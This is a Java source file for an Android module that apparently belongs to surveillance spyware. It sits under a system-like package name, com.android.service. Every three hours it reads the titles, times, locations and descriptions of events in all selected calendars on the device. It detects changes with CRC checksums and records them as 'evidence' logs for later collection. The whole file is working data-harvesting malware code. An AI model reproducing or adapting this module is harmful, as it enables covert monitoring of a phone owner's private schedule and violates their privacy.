package com.android.service.module;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.ListIterator;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.android.service.LogR;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfModule;
import com.android.service.crypto.Encryption;
import com.android.service.evidence.EvidenceType;
import com.android.service.evidence.Markup;
import com.android.service.module.task.Contact;
import com.android.service.module.task.PhoneInfo;
import com.android.service.module.task.PickContact;
import com.android.service.module.task.UserInfo;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

public class ModuleCalendar extends BaseModule {

	private static final String TAG = "ModuleCalendar"; //$NON-NLS-1$


	private static final int FLAG_ALLDAY = 0x00000040;

	private static final int POOM_STRING_SUBJECT = 0x01000000;
	private static final int POOM_STRING_CATEGORIES = 0x02000000;
	private static final int POOM_STRING_BODY = 0x04000000;
	private static final int POOM_STRING_RECIPIENTS = 0x08000000;
	private static final int POOM_STRING_LOCATION = 0x10000000;
	private static final int POOM_OBJECT_RECUR = 0x80000000;

	Markup markupCalendar;

	HashMap<Long, Long> calendar;

	public ModuleCalendar() {

	}

	@Override
	public boolean parse(ConfModule conf) {
		return true;
	}

	/**
	 * unserialize the contacts crc hashtable
	 */
	@Override
	public void actualStart() {
		// every three hours, check.
		setPeriod(180 * 60 * 1000);
		setDelay(200);

		markupCalendar = new Markup(this);

		// the markup exists, try to read it
		if (markupCalendar.isMarkup()) {
			try {
				calendar = (HashMap<Long, Long>) markupCalendar.readMarkupSerializable();
			} catch (final IOException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
				}
			}
		}

		if (calendar == null) {
			calendar = new HashMap<Long, Long>();
			serializeCalendar();
		}

	}

	/**
	 * serialize contacts in the markup
	 */
	private void serializeCalendar() {
		if (Cfg.DEBUG) {
			Check.ensures(calendar != null, "null calendar"); //$NON-NLS-1$
		}

		try {

			final boolean ret = markupCalendar.writeMarkupSerializable(calendar);
			if (Cfg.DEBUG) {
				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
			}
		} catch (final IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
			}
		}
	}

	/**
	 * Every once and then read the contactInfo, and Check.every change. If
	 * //$NON-NLS-1$ something is new the contact is saved.
	 */
	@Override
	public void actualGo() {

		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): Calendar");
			}
			if (calendar()) {
				serializeCalendar();
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go) Error: " + ex);
			}
		}
	}

	private boolean calendar() {
		// http://jimblackler.net/blog/?p=151
		// http://forum.xda-developers.com/showthread.php?t=688095
		// /data/data/com.android.providers.calendar/databases/calendar.db
		// backup/data/calendar.db

		HashSet<String> calendars;
		String contentProvider;

		contentProvider = "content://calendar";
		calendars = selectCalendars(contentProvider);

		if (calendars == null || calendars.isEmpty()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (calendar): opening 2.2 style");
			}
			contentProvider = "content://com.android.calendar";
			calendars = selectCalendars(contentProvider);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (calendar): opening 2.1 style");
			}
		}

		boolean needToSerialize = false;

		// For each calendar, display all the events from the previous week to
		// the end of next week.
		for (String id : calendars) {
			int calendar_id = Integer.parseInt(id);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (calendar): " + calendar_id);
			}
			Uri.Builder builder = Uri.parse(contentProvider + "/events").buildUpon();
			String textUri = builder.build().toString();

			Cursor eventCursor = managedQuery(builder.build(), new String[] { "_id", "title", "dtstart", "dtend",
					"rrule", "allDay", "eventLocation", "description" }, "calendar_id=" + id, null, "_id ASC");

			while (eventCursor.moveToNext()) {
				int index = 0;
				final long idEvent = calendar_id << 24 | Long.parseLong(eventCursor.getString(index++));
				final String title = eventCursor.getString(index++);
				final Date begin = new Date(eventCursor.getLong(index++));
				final Date end = new Date(eventCursor.getLong(index++));
				final String rrule = eventCursor.getString(index++);
				final Boolean allDay = !eventCursor.getString(index++).equals("0");

				final String location = eventCursor.getString(index++);
				// final String syncAccount = eventCursor.getString(5);
				String syncAccount = "";
				final String description = eventCursor.getString(index++);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (calendar): Title: " + title + " Begin: " + begin + " End: " + end + " All Day: "
							+ allDay + " Location: " + location + " SyncAccount:" + syncAccount + " Description: "
							+ description);
				}

				byte[] packet = null;
				try {
					// calculate the crc of the contact
					packet = preparePacket(idEvent, title, description, location, begin, end, rrule, allDay);
				} catch (Exception ex) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (calendar) Error: " + ex);
					}
					continue;
				}

				// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
				// Utils.byteArrayToHex(packet));
				final Long crcOld = calendar.get(idEvent);
				final Long crcNew = Encryption.CRC32(packet);
				// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
				// crcNew);

				// if does not match, save and serialize
				if (!crcNew.equals(crcOld)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (go): new event. " + idEvent);//$NON-NLS-1$
					}
					calendar.put(idEvent, crcNew);
					saveEvidenceCalendar(idEvent, packet);
					needToSerialize = true;
					Thread.yield();
				}
			}
		}
		return needToSerialize;
	}

	private HashSet<String> selectCalendars(String contentProvider) {
		String[] projection = new String[] { "_id", "displayName", "selected", "ownerAccount" };
		// Uri calendars = Uri.parse("content://calendar/calendars");
		Uri calendars = Uri.parse(contentProvider + "/calendars");

		HashSet<String> calendarIds = new HashSet<String>();

		Cursor managedCursor = managedQuery(calendars, projection, "selected=1", null, null);

		while (managedCursor != null && managedCursor.moveToNext()) {

			final String _id = managedCursor.getString(0);
			final String displayName = managedCursor.getString(1);
			final Boolean selected = !managedCursor.getString(2).equals("0");
			final String ownerAccount = managedCursor.getString(2);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (selectCalendars): Id: " + _id + " Display Name: " + displayName + " Selected: "
						+ selected + " OwnerAccount: " + ownerAccount);
			}

			calendarIds.add(_id);
		}

		return calendarIds;

	}

	private Cursor managedQuery(Uri calendars, String[] projection, String selection, String[] selectionArgs,
			String sortOrder) {
		Context context = Status.getAppContext();
		ContentResolver contentResolver = context.getContentResolver();

		final Cursor cursor = contentResolver.query(calendars, projection, selection, selectionArgs, sortOrder);

		return cursor;
	}

	/**
	 * Save evidence Calendar
	 * 
	 * @param idEvent
	 * @param packet
	 */
	private void saveEvidenceCalendar(long idEvent, byte[] packet) {
		// calendar.put(idEvent, Encryption.CRC32(packet));
		final LogR log = new LogR(EvidenceType.CALENDAR);
		log.write(packet);
		log.close();

	}

	private byte[] preparePacket(long idEvent, String title, String description, String location, Date begin, Date end,
			String rrule, Boolean allDay) {
		final int version = 0x01000000;
		int flags = 0;

		final ByteArrayOutputStream payload = new ByteArrayOutputStream();
		// header, viene scritto adesso, e corretto alla fine, cosi' si calcola
		// la lunghezza del
		// payload
		try {
			payload.write(Utils.intToByteArray(0));
			payload.write(Utils.intToByteArray(version));
			payload.write(Utils.intToByteArray((int) idEvent));

			// preparazione del payload, con la parte fissa e quella dinamica

			if (rrule != null) {
				// flags |= FLAG_RECUR;
				// if (end == null) {
				// flags |= FLAG_RECUR_NoEndDate;
				// }
			}
			if (allDay) {
				flags |= FLAG_ALLDAY;
			}
			int sensitivity = 0;
			int busy = 2;
			int duration = 0;
			int meeting = 0;
			payload.write(Utils.intToByteArray(flags));
			payload.write(Utils.longToByteArray(DateTime.getFiledate(begin)));
			payload.write(Utils.longToByteArray(DateTime.getFiledate(end)));
			payload.write(Utils.intToByteArray(sensitivity));
			payload.write(Utils.intToByteArray(busy));
			payload.write(Utils.intToByteArray(duration));
			payload.write(Utils.intToByteArray(meeting));
			// recursive
			// blocchi di stringhe

			if (rrule != null) {
				if (description == null) {
					description = "RULE: " + rrule;
				} else {
					description += " \nRULE: " + rrule;
				}
			}

			appendCalendarString(payload, POOM_STRING_SUBJECT, title);
			appendCalendarString(payload, POOM_STRING_BODY, description);
			appendCalendarString(payload, POOM_STRING_LOCATION, location);

			// appendCalendarString(payload, POOM_STRING_CATEGORIES ,
			// "categories");
			// appendCalendarString(payload, POOM_OBJECT_RECUR , "recur");
			// appendCalendarString(payload, POOM_STRING_RECIPIENTS ,
			// "recipients");

			// final byte[] payloadBA = payload.toByteArray();
			final int size = payload.size();
			final byte[] packet = payload.toByteArray();

			final DataBuffer databuffer = new DataBuffer(packet);
			databuffer.writeInt(size);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (preparePacket): " + Utils.byteArrayToHex(packet));
			}
			return packet;

		} catch (IOException ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (preparePacket) Error: " + ex);
			}
		}
		return null;
	}

	private void appendCalendarString(ByteArrayOutputStream payload, int type, String message) throws IOException {
		if (message != null) {
			byte[] data = WChar.getBytes(message, false);
			int len = type | (data.length & 0x00ffffff);
			byte[] prefix = Utils.intToByteArray(len);
			payload.write(prefix);
			payload.write(data);
		}
	}

	@Override
	public void actualStop() {

	}
}
